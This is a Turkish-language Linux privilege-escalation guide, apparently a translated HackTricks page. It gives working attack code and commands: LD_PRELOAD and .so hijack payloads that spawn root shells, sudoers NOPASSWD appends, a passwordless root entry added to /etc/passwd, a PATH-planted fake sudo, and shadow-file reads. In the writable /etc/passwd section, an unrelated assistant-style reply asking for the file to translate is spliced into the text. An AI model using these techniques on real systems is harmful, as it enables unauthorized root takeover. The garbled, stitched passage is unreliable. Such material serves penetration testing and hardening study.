Bir örnek politika `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde verilmiştir; bu örnek, root kullanıcısına `fi.w1.wpa_supplicant1`'e sahip olma, ona gönderme ve ondan mesaj alma izinlerini detaylandırır.

Kullanıcı veya grup belirtilmemiş politikalar evrensel olarak uygulanırken, "default" context politikaları diğer özel politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini enumerate etmeyi ve exploit etmeyi burada öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilgi çekicidir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Erişim sağlamadan önce daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer edebiliyorsanız, bazı credentials elde edebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

**Kim** olduğunuzu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemde hangi **kullanıcılar** olduğunu, hangilerinin **giriş** yapabildiğini ve hangilerinin **root ayrıcalıklarına** sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları yükseltmesine izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**İstismar etmek için kullanın:** **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları sağlayabilecek bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Mümkündürse panonun içinde ilginç bir şey olup olmadığını kontrol edin
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın **herhangi bir parolasını biliyorsanız**, parolayı kullanarak **her kullanıcı** olarak giriş yapmayı deneyin.

### Su Brute

Eğer çok fazla gürültü çıkarmayı umursamıyorsanız ve bilgisayarda `su` ve `timeout` ikili dosyaları bulunuyorsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) ile kullanıcıya brute-force yapmayı deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile de kullanıcıları brute-force etmeye çalışır.

## Yazılabilir $PATH kötüye kullanımları

### $PATH

Eğer **$PATH içindeki bazı klasörlerin içine yazabiliyorsanız** , farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla **yazılabilir klasörün içine bir backdoor oluşturmak** suretiyle yetki yükseltmesi elde edebilirsiniz; bunun için komutun **$PATH'te yazılabilir klasörünüzden önce yer alan bir klasörden yüklenmemesi** gerekir.

### SUDO and SUID

Bazı komutları sudo kullanarak çalıştırma izniniz olabilir veya bazı dosyalar suid bitiyle işaretlenmiş olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumaya ve/veya yazmaya ya da hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla parola bilmeden bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; artık root directory'ye bir ssh key ekleyerek veya `sh` çağırarak kolayca bir shell elde etmek mümkün.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **set an environment variable** yapmasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayanan**, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **savunmasızdı:**
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo yürütme atlatma yolları

**Jump** ile diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu olmadan

Eğer **sudo permission** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bundan yararlanabilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary başka bir komutu komutun yolunu belirtmeden çalıştırıyorsa da kullanılabilir (garip bir SUID binary'nin içeriğini her zaman _**strings**_ ile kontrol edin).

[Payload examples to execute.](payloads-to-execute.md)

### Komut yoluna sahip SUID binary

Eğer **suid** binary **yolu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı isimde bir fonksiyon **export** etmeyi deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid ikiliyi çağırdığınızda bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Yetki yükseltmesi, `sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi bulunuyorsa gerçekleşebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin `sudo` ile komutlar çalıştırıldığında bile kalıcı olmasına ve tanınmasına izin vererek, potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Kaydet: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından **derleyin** şu şekilde:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırırken
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa suistimal edilebilir; çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen **SUID** izinlerine sahip bir ikiliyle karşılaşıldığında, **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, istismar için potansiyel olduğunu gösterir.

Bunu istismar etmek için, aşağıdaki kodu içeren _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklara sahip bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlamaktadır.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'nin çalıştırılması istismarı tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine olanak sağlamalıdır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabileceğimiz bir dizinden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli isimle o dizine kütüphaneyi oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Eğer şöyle bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) saldırganın yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix binaries'lerinin özenle hazırlanmış bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) komut içine **sadece argüman enjekte edebildiğiniz** durumlar için aynıdır.

Proje, kısıtlı shells'lerden kaçmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya transferi yapmak, bind and reverse shells oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix binaries'lerinin meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` komutuna erişiminiz varsa, herhangi bir sudo kuralının nasıl istismar edilebileceğini kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Şifreye sahip olmadığınız ancak **sudo access**'iniz olduğu durumlarda, bir sudo komutunun çalıştırılmasını **bekleyip session token'ını kaçırarak** ayrıcalıkları yükseltebilirsiniz.

Requirements to escalate privileges:

- Zaten _sampleuser_ olarak bir shell'iniz var
- _sampleuser_ **`sudo` kullanmış** olmalı ve bunu **son 15 dakika** içinde yapmış olmalı (varsayılan olarak bu, şifre girmeden `sudo` kullanmamıza izin veren sudo token'ın süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- İkinci **exploit** (`exploit_v2.sh`) _/tmp_ içinde bir sh shell oluşturacaktır; bu shell **root tarafından sahip olunan ve setuid bitine sahip** olacaktır.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Üçüncü exploit** (`exploit_v3.sh`) **bir sudoers file oluşturacak**; bu **sudo tokens'ı ebedi yapacak ve tüm kullanıcıların sudo kullanmasına izin verecek**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulmuş dosyaların herhangi birinde **yazma izinlerine** sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ile bir kullanıcı ve PID için **sudo token** oluşturabilirsiniz.\  
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şu şekilde parola bilmenize gerek kalmadan **sudo ayrıcalıkları elde edebilirsiniz**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimin `sudo` kullanabileceğini ve bunun nasıl yapılacağını belirler.\
Bu dosyalar **varsayılan olarak yalnızca user root ve group root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgileri **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** yetkileri **yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` ikili dosyasına OpenBSD için `doas` gibi bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf`'ta kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir kullanıcının ayrıcalıkları yükseltmek için genellikle bir makineye bağlanıp `sudo` kullandığını biliyorsanız ve o kullanıcı bağlamı içinde bir shell elde ettiyseniz, **yeni bir sudo executable oluşturabilirsiniz**; bu executable önce kodunuzu root olarak çalıştırır, ardından kullanıcının komutunu yürütür. Sonra, kullanıcı bağlamının **$PATH**'ini değiştirin (örneğin yeni yolu .bash_profile içine ekleyerek) böylece kullanıcı sudo'yu çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Dikkat: eğer kullanıcı farklı bir shell (bash değil) kullanıyorsa yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Bu yanlış yapılandırmanın **nasıl istismar edileceğine** aşağıdaki sayfada göz atın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalarsanız, program burada `RPATH` değişkeninde belirtildiği gibi onu kullanacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Sonra `/var/tmp` dizinine `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux yetkileri bir sürece mevcut root ayrıcalıklarının **alt kümesini** sağlar. Bu, root **ayrıcalıklarını daha küçük ve farklı birimlere** ayırır. Bu birimlerin her biri süreçlere bağımsız olarak verilebilir. Böylece ayrıcalıkların tamamı azaltılarak istismar riskleri düşürülür.\
Aşağıdaki sayfayı okuyun, **yetkiler ve bunların nasıl kötüye kullanılacağı hakkında daha fazla bilgi edinmek için**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Dizinde, **"execute" biti** etkilenmiş kullanıcının "**cd**" ile klasöre girebileceğini ifade eder.\
**"read"** biti kullanıcının **dosyaları listeleyebileceğini**, ve **"write"** biti kullanıcının **yeni dosyalar oluşturup silebileceğini** gösterir.

## ACLs

Erişim Kontrol Listeleri (ACLs), keyfi izinlerin ikincil katmanını temsil eder ve **geleneksel ugo/rwx izinlerini geçersiz kılabilir**. Bu izinler, sahip olmayan veya grup üyesi olmayan belirli kullanıcılara hak verip/vermeme yoluyla dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu **ince ayar seviyesi daha hassas erişim yönetimi** sağlar. Daha fazla detay [**burada**](https://linuxconfig.org/how-to-manage-acls-on-linux) bulunabilir.

**Ver** kullanıcı "kali"ya bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Sistemden belirli ACL'lere sahip dosyaları al:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell sessions

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** session'larını **hijack** edebilirsiniz.\
**En yeni sürümlerde** yalnızca **kendi kullanıcınızın** screen sessions'larına **connect** olabilirsiniz. Ancak **session içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen sessions'ları listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Bir session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümlerinde** bir sorundu. root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ayrıcalıksız kullanıcı olarak ele geçiremedim.

**tmux oturumlarını listeleme**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** için bir örneğe bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

September 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, söz konusu OS'lerde yeni bir ssh anahtarı oluşturulduğunda ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key authentication'e izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola doğrulaması izinli olduğunda, sunucunun boş parola dizilerine sahip hesaplara giriş izni verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

Root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: root yalnızca private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no`: hayır

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi token'lar içerebilir; bu token'lar home dizini ile değiştirilecektir. **Mutlak yolları belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının home dizininden göreli yollar**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtarları bırakmak yerine **use your local SSH keys instead of leaving keys** kullanmanızı sağlar. Böylece ssh ile **jump** **to a host** yapabilir ve oradan **jump to another** **host**'a, **initial host**'unuzda bulunan **key**i **using** ederek erişebilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat edin: Eğer `Host` `*` ise kullanıcı farklı bir makineye bağlandığında o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu seçenekleri **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
Dosya `/etc/sshd_config`, `AllowAgentForwarding` anahtar kelimesi ile ssh-agent forwarding'e izin verebilir veya engelleyebilir (varsayılan izinlidir).

Eğer bir ortamda Forward Agent yapılandırıldığını görürseniz aşağıdaki sayfayı okuyun, çünkü **bunu kötüye kullanarak yetki yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında yürütülen **scripts**'lerdir. Bu nedenle, bunlardan herhangiğini **yazabiliyor veya değiştirebiliyorsanız yetki yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir tuhaf profile script bulunursa, onu **hassas bilgiler** açısından kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isimle kullanılıyor olabilir veya bir yedeği bulunabilir. Bu nedenle **tümünü bulun** ve dosyaları **okuyup okuyamadığınızı kontrol edin**; dosyaların içinde **hashes** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasında **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Çeviri yapabilmem için lütfen src/linux-hardening/privilege-escalation/README.md dosyasının içeriğini gönderir misiniz?

Ayrıca netleştirmek istiyorum:
- Bu dosyaya “hacker” kullanıcısını eklememi ve oluşturulmuş şifreyi dosyaya eklememi mi istiyorsunuz, yoksa sistemde gerçekten bir kullanıcı oluşturmamı mı bekliyorsunuz? (Ben sistemde değişiklik yapamam — sadece dosya içeriğini düzenleyebilirim.)
- Şifreyi benim oluşturup dosyaya eklememi ister misiniz? Eğer evet ise, kaç karakterlik ve hangi karakter tiplerini (büyük/küçük harf, rakam, sembol) tercih edersiniz? Varsayılan olarak güçlü, 16 karakterlik rastgele bir şifre oluşturabilirim.

İçeriği gönderin ve tercihlerinizi onaylayın; çeviriyi ve istenen eklemeyi yapıp geri döneceğim.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini zayıflatabilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

